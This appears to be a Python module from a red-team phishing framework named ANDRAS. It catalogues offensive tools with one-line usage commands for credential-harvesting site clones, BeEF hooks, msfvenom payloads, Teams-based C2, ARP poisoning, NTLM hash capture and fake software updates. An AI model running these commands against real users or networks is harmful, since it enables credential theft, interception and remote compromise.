"""Arsenal de ingeniería social: catálogo, detección y encaje con ANDRAS.

Cada ficha dice qué hace la herramienta, cómo se instala y en qué punto de una campaña
entra. Muchas son de Parrot y no corren en macOS sin docker, root o red local: la ficha lo
declara en `needs` para no vender humo.

Este módulo no ejecuta nada salvo `which`: el catálogo se consulta, no se lanza.
"""

from __future__ import annotations

import shutil
import sqlite3
import subprocess
from dataclasses import dataclass
from pathlib import Path

CATEGORIES = ("clonado", "proxy", "red", "marca", "captura", "payload", "agente")
ALIASES = {
    "cloning": "clonado",
    "network": "red",
    "branding": "marca",
    "capture": "captura",
    "agent": "agente",
}


@dataclass(frozen=True, slots=True)
class Tool:
    key: str
    name: str
    category: str
    what: str
    binary: str
    install: str
    use: str
    fit: str
    needs: str = ""
    local: str = ""
    container: str = ""


TOOLS: tuple[Tool, ...] = (
    Tool(
        "set",
        "Social-Engineer Toolkit",
        "clonado",
        "Clona una página de registro y captura lo que se teclea (Credential Harvester → Site Cloner). También correo masivo y payloads.",
        "setoolkit",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "setoolkit → 1 → 2 → 3 → 2 y pegas la URL del portal",
        "Opción rápida para clonar sin escribir código; exige Docker y Apache.",
        "linux, docker",
        "",
        container="setoolkit",
    ),
    Tool(
        "httrack",
        "HTTrack",
        "clonado",
        "Copia un sitio entero a disco para espejarlo sin depender del original.",
        "httrack",
        "brew install httrack",
        "httrack https://portal.ejemplo.com -O ./clon",
        "Motor de copia si se prefiere un espejo estático al clonador propio.",
        "red",
    ),
    Tool(
        "beef",
        "BeEF",
        "payload",
        "Framework de explotación de navegador: engancha por JS y lanza módulos sobre la sesión del objetivo.",
        "beef-xss",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "Se inyecta el hook en la landing y se opera en http://127.0.0.1:3000",
        "Hook en la landing para saber si el navegador es vulnerable y mantener vivo el enlace.",
        "linux, red",
        "",
        container="beef-xss",
    ),
    Tool(
        "msfpc",
        "MSFvenom Payload Creator",
        "payload",
        "Envuelve msfvenom para generar ejecutables con el listener ya montado.",
        "msfpc",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "msfpc exe 192.168.1.10",
        "Adjunto ejecutable cuando el pretexto pide descargar algo.",
        "linux, metasploit",
        "",
        container="msfpc",
    ),
    Tool(
        "convoc2",
        "Convo C2",
        "payload",
        "C2 a través de Microsoft Teams: el tráfico parece corporativo y no hay dominio nuevo que justificar.",
        "convoC2",
        "se compila dentro de la imagen andras/arsenal",
        "scripts/in-docker.sh convoC2 -b 0.0.0.0 y luego el agente contra esa IP",
        "Persistencia que no chirría en entornos Microsoft 365.",
        "linux, azure",
        "",
        container="convoC2",
    ),
    Tool(
        "mitmproxy",
        "mitmproxy",
        "proxy",
        "Proxy HTTP/HTTPS con consola: intercepta, edita y repite en vivo.",
        "mitmproxy",
        "pip install mitmproxy",
        "mitmproxy -p 8080 y configura el navegador con ese proxy",
        "Base para el proxy inverso: reescribe formularios y captura cuerpos.",
        "python",
    ),
    Tool(
        "bettercap",
        "bettercap",
        "proxy",
        "Framework MITM modular: ARP, DNS, HTTP y BLE desde una consola.",
        "bettercap",
        "brew install bettercap",
        "bettercap -iface en0 y dentro `net.probe on`",
        "MITM en red local, para objetivos en la misma red que el operador.",
        "root, red local",
    ),
    Tool(
        "sslsplit",
        "sslsplit",
        "proxy",
        "Interceptación TLS transparente con CA propia.",
        "sslsplit",
        "brew install sslsplit",
        "sslsplit -D -l conn.log -k ca.key -c ca.crt ssl 0.0.0.0 8443",
        "Cuando el flujo pasa por la red del operador y quieres ver el TLS.",
        "root, red local",
    ),
    Tool(
        "ettercap",
        "Ettercap",
        "proxy",
        "MITM clásico por ARP poisoning con filtros de contenido.",
        "ettercap",
        "brew install ettercap",
        "ettercap -Tq -M arp:remote /192.168.1.1// /192.168.1.20//",
        "Alternativa a bettercap si ya se domina su filtro.",
        "root, red local",
    ),
    Tool(
        "responder",
        "Responder",
        "red",
        "Envenena LLMNR, NBT-NS y mDNS y captura hashes NTLM del segmento.",
        "scripts/responder.sh",
        "incluido en vendor/ (necesita root)",
        "scripts/responder.sh -I en0 -w -r -f",
        "Saca usuarios y hashes sin tocar al objetivo: alimenta correos y pretextos.",
        "root, red local",
        local="scripts/responder.sh",
    ),
    Tool(
        "dnschef",
        "DNSchef",
        "red",
        "Proxy DNS falso: responde lo que le digas para cada dominio.",
        "dnschef",
        "pip install dnschef-ng (dentro del venv)",
        "dnschef --fakeip 192.168.1.10 --fakedomains portal.ejemplo.com",
        "Redirige sólo el portal al clon sin tocar el DNS real de la víctima.",
        "root, red local",
    ),
    Tool(
        "rebind",
        "rebind",
        "red",
        "DNS rebinding para saltarse la Same-Origin Policy.",
        "scripts/dnsrebinder.sh",
        "incluido en vendor/ (necesita root)",
        "scripts/dnsrebinder.sh --domain rebind.x.com --rebind 127.0.0.1 --ip 8.8.8.8",
        "Cuando el portal comprueba origen y el clon en otro dominio no basta.",
        "root, red local",
        local="scripts/dnsrebinder.sh",
    ),
    Tool(
        "evil-ssdp",
        "evil-ssdp",
        "red",
        "Se hace pasar por dispositivo UPnP y pesca hashes NTLM por SSDP.",
        "scripts/evil-ssdp.sh",
        "incluido en vendor/ (necesita root)",
        "scripts/evil-ssdp.sh en0 --template",
        "Captura NTLM sin correo: útil si el objetivo está en la misma red.",
        "root, red local",
        local="scripts/evil-ssdp.sh",
    ),
    Tool(
        "wifi-honey",
        "Wi-Fi Honey",
        "red",
        "Honeypot Wi-Fi con portal cautivo que registra lo que se envía.",
        "wifi-honey",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "wifi-honey",
        "Objetivo que trabaja desde redes públicas o de hotel.",
        "linux, root",
        "",
        container="wifi-honey",
    ),
    Tool(
        "yersinia",
        "Yersinia",
        "red",
        "Ataques de capa 2: DHCP, STP, VTP, CDP.",
        "scripts/yersinia.sh",
        "compilado en vendor/ (necesita root)",
        "scripts/yersinia.sh -I",
        "Tumbar o suplantar servicios de red antes de un MITM.",
        "root, red local",
        local="scripts/yersinia.sh",
    ),
    Tool(
        "thc-ipv6",
        "THC IPv6",
        "red",
        "Toolkit IPv6: router advertisements y DHCPv6 falsos, entre otros.",
        "atk6-",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "scripts/in-docker.sh atk6-fake_router6 en0",
        "Redes con IPv6 donde el ARP clásico no sirve.",
        "linux, root, red local",
        "",
        container="atk6-fake_router6",
    ),
    Tool(
        "fiked",
        "fiked",
        "red",
        "Suplanta un gateway VPN Cisco y captura credenciales XAUTH.",
        "fiked",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "fiked -g 192.168.1.10 -k vpn.key -c vpn.crt",
        "Objetivo que entra por VPN corporativa.",
        "linux, root",
        "",
        container="fiked",
    ),
    Tool(
        "evilgrade",
        "isr-evilgrade",
        "red",
        "Suplanta actualizaciones de software para inyectar un binario.",
        "evilgrade",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "evilgrade y dentro `show modules`, `configure`",
        "Cuando el pretexto es «actualiza esta aplicación».",
        "linux",
        "",
        container="evilgrade",
    ),
    Tool(
        "sniffjoke",
        "Sniffjoke",
        "red",
        "Ofusca conexiones TCP para estropear la reconstrucción de sesión.",
        "sniffjoke",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "sniffjoke --start",
        "Contra un objetivo con analistas mirando el tráfico.",
        "linux, root",
        "",
        container="sniffjoke",
    ),
    Tool(
        "eyewitness",
        "EyeWitness",
        "marca",
        "Capturas, cabeceras y credenciales por defecto de una lista de URLs.",
        "scripts/eyewitness.sh",
        "incluido en vendor/; usa el Chrome instalado",
        "scripts/eyewitness.sh --web -f urls.txt -d salida",
        "Inventariar portales del cliente antes de elegir cuál clonar.",
        "",
        local="scripts/eyewitness.sh",
    ),
    Tool(
        "urlcrazy",
        "URLCrazy",
        "marca",
        "Genera y comprueba variantes tipográficas del dominio (typosquatting).",
        "scripts/urlcrazy.sh",
        "incluida en vendor/ (necesita ruby); no está en rubygems",
        "scripts/urlcrazy.sh acme.com",
        "Elegir dominio parecido cuando no se puede usar el real.",
        "ruby",
        local="scripts/urlcrazy.sh",
    ),
    Tool(
        "picoclaw",
        "PicoClaw",
        "agente",
        "Agente personal en Go (<10 MB de RAM) con workspace, skills y gateway de canales; "
        "sirve para pilotar la campaña desde Telegram o un móvil viejo.",
        "scripts/picoclaw.sh",
        "incluido en vendor/picoclaw",
        "scripts/picoclaw.sh onboard y luego `agent` o `gateway`",
        "Segundo par de manos fuera de la terminal; su workspace queda en data/picoclaw.",
        "",
        local="scripts/picoclaw.sh",
    ),
    Tool(
        "wireshark",
        "Wireshark",
        "captura",
        "Analizador de tráfico gráfico con disección de protocolos.",
        "wireshark",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "wireshark -i en0 -k",
        "Ver qué manda de verdad la landing y si el formulario viaja como crees.",
        "root, interfaz",
        "",
        container="tshark",
    ),
    Tool(
        "dsniff",
        "dsniff",
        "captura",
        "Sniffers de credenciales en claro: urlsnarf, mailsnarf, webspy.",
        "urlsnarf",
        "incluido en la imagen andras/arsenal (necesita `andras toolbox image`)",
        "urlsnarf -i en0",
        "Comprobar en claro qué URLs pide el objetivo y en qué orden.",
        "root, red local",
        "",
        container="urlsnarf",
    ),
    Tool(
        "tcpreplay",
        "tcpreplay",
        "captura",
        "Reinyecta capturas pcap a la velocidad que quieras.",
        "tcpreplay",
        "brew install tcpreplay",
        "tcpreplay -i en0 -t captura.pcap",
        "Reproducir una sesión ya grabada en un ensayo.",
        "root",
    ),
)

BY_KEY = {tool.key: tool for tool in TOOLS}


class ToolboxError(RuntimeError):
    pass


def _norm(category: str) -> str:
    return ALIASES.get(category.strip().lower(), category.strip().lower())


def all_tools(category: str = "") -> list[Tool]:
    category = _norm(category)
    if category and category not in CATEGORIES:
        raise ToolboxError(f"categoría desconocida: {category}")
    return [t for t in TOOLS if not category or t.category == category]


def get(key: str) -> Tool:
    try:
        return BY_KEY[key]
    except KeyError:
        raise ToolboxError(f"herramienta desconocida: {key}") from None


def local_bin(name: str) -> str:
    """Ruta en `~/.local/bin`, que no suele estar en el PATH de la app."""
    candidate = Path.home() / ".local" / "bin" / name
    return str(candidate) if candidate.is_file() else ""


def venv_bin(name: str) -> str:
    """El entorno donde corre ANDRAS, para no depender de que esté activado."""
    import sys

    candidate = Path(sys.prefix) / "bin" / name
    return str(candidate) if candidate.is_file() else ""


def resolve_bin(tool: Tool) -> str:
    """Binario usable: primero el vendorizado en el repo, luego el del entorno o el PATH."""
    if tool.local:
        from andras.core import ROOT

        path = ROOT / tool.local
        return str(path) if path.is_file() else ""
    if tool.binary.endswith("-"):
        for suffix in ("fake_router6", "flood_router6"):
            found = (
                venv_bin(tool.binary + suffix)
                or shutil.which(tool.binary + suffix)
                or local_bin(tool.binary + suffix)
            )
            if found:
                return found
        return ""
    return venv_bin(tool.binary) or shutil.which(tool.binary) or local_bin(tool.binary)


_IMAGE: bool | None = None


def image_ready() -> bool:
    """¿Está construida la imagen con las herramientas sólo-Linux? Se cachea."""
    global _IMAGE
    if _IMAGE is None:
        try:
            _IMAGE = (
                subprocess.run(
                    ["docker", "image", "inspect", "andras/arsenal"], capture_output=True, check=False
                ).returncode
                == 0
            )
        except OSError:
            _IMAGE = False
    return _IMAGE


def installed(tool: Tool) -> bool:
    if tool.container:
        return image_ready()
    return bool(resolve_bin(tool))


def argv_for(tool: Tool, *args: str) -> list[str]:
    """Prefija el contenedor cuando la herramienta no corre en macOS."""
    if tool.container:
        from andras.core import ROOT

        return [str(ROOT / "scripts" / "in-docker.sh"), tool.container, *args]
    return [resolve_bin(tool), *args]


def blocker(tool: Tool) -> str:
    """Por qué no sirve en esta máquina, si es que no sirve."""
    needs = tool.needs.split(", ") if tool.needs else []
    reasons = []
    if tool.container:
        reasons.append("sólo corre dentro del contenedor Linux andras/arsenal (no nativo)")
        if not image_ready():
            reasons.append("falta la imagen; `andras toolbox image` la construye")
    elif "linux" in needs:
        reasons.append("necesita Linux (docker o Parrot): aquí no corre nativo")
    if "root" in needs:
        reasons.append("necesita root")
    if "red local" in needs:
        reasons.append("sólo tiene sentido si el objetivo está en tu red")
    return "; ".join(reasons)


def card(tool: Tool) -> str:
    state = "instalada" if installed(tool) else "no instalada"
    lines = [
        f"## {tool.name} ({tool.key}) · {tool.category} · {state}",
        f"Qué hace: {tool.what}",
        f"Instalar: {tool.install}",
        f"Uso: {tool.use}",
        f"Encaje en ANDRAS: {tool.fit}",
    ]
    if tool.needs:
        lines.append(f"Requiere: {tool.needs}")
    stop = blocker(tool)
    if stop:
        lines.append(f"Aviso: {stop}")
    return "\n".join(lines)


def table(category: str = "") -> str:
    rows = ["herramienta | categoría | estado | encaje"]
    rows += [
        f"{t.key} | {t.category} | {'sí' if installed(t) else 'no'} | {t.fit[:70]}"
        for t in all_tools(category)
    ]
    return "\n".join(rows)


def summary() -> str:
    ready = [t for t in TOOLS if installed(t)]
    pending = [t for t in TOOLS if not installed(t)]
    return f"{len(TOOLS)} fichas · {len(ready)} instaladas · {len(pending)} pendientes\n" + "\n".join(
        f"- {t.key}: {t.install}" for t in pending
    )


def missing(category: str = "") -> list[Tool]:
    return [t for t in all_tools(category) if not installed(t)]


def record_check(conn: sqlite3.Connection, mission_id: str) -> dict:
    """Deja constancia en la misión de qué herramientas estaban disponibles al planificar."""
    from andras.store.db import now

    ready = sorted(t.key for t in TOOLS if installed(t))
    payload = ",".join(ready)
    conn.execute(
        "UPDATE missions SET notes = COALESCE(notes,'') || ? WHERE id = ?",
        (f"\n[arsenal {now()}] disponibles: {payload or 'ninguna'}", mission_id),
    )
    return {"ready": ready, "missing": sorted(t.key for t in TOOLS if t.key not in ready)}


RUNNABLE = ("httrack", "urlcrazy", "eyewitness")


def outdir(mission_id: str, key: str) -> Path:
    from andras.core import ROOT

    path = ROOT / "data" / "toolbox" / mission_id / key
    path.mkdir(parents=True, exist_ok=True)
    return path


def _args(key: str, target: str, dest: Path) -> list[str]:
    if key == "httrack":
        return [target, "-O", str(dest), "-q", "-%v"]
    if key == "urlcrazy":
        return [target]
    return ["--web", target, "-d", str(dest)]


def run_tool(key: str, target: str, mission_id: str = "", *, timeout: int = 300) -> tuple[bool, str, str]:
    """Ejecuta una herramienta de la lista blanca. Devuelve (ok, salida, carpeta)."""
    tool = get(key)
    if key not in RUNNABLE:
        raise ToolboxError(f"{key} no se puede lanzar todavía ({', '.join(RUNNABLE)} sí)")
    if not target.strip():
        raise ToolboxError("falta el objetivo")
    if not installed(tool):
        raise ToolboxError(f"{tool.name} no está instalada: {tool.install}")
    dest = outdir(mission_id or "sin-mision", key)
    return _exec(argv_for(tool, *_args(key, target.strip(), dest)), dest, timeout)


def build_image() -> tuple[bool, str]:
    """Construye la imagen con las herramientas que no corren en macOS."""
    global _IMAGE
    from andras.core import ROOT

    if not shutil.which("docker"):
        return False, "docker no está en el PATH"
    _IMAGE = None
    proc = subprocess.run(
        [
            "docker",
            "build",
            "-f",
            str(ROOT / "docker" / "arsenal.Dockerfile"),
            "-t",
            "andras/arsenal",
            str(ROOT),
        ],
        check=False,
        capture_output=True,
        text=True,
    )
    output = ((proc.stdout or "") + (proc.stderr or "")).strip()
    ok = proc.returncode == 0 and image_ready()
    return ok, output[-4000:] or "sin salida"


def _exec(argv: list[str], dest: Path, timeout: int) -> tuple[bool, str, str]:
    import subprocess

    try:
        proc = subprocess.run(argv, check=False, timeout=timeout, capture_output=True, text=True)
    except (OSError, subprocess.SubprocessError) as exc:
        return False, f"no se pudo lanzar: {exc}", str(dest)
    output = (proc.stdout or "") + (proc.stderr or "")
    ok = proc.returncode == 0
    (dest / "salida.txt").write_text(output[-20000:], errors="replace")
    return ok, output.strip()[-4000:] or "sin salida", str(dest)
